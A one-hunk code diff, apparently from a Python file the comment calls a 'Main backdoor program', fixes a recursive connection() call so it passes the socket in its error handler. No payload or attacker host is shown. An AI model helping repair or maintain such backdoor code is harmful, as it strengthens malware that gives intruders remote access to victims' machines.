@@ -93,7 +93,7 @@ def connection(sock):
             sock.close()
             break
         except:
-            connection()
+            connection(sock)
 
 
 # Main backdoor program
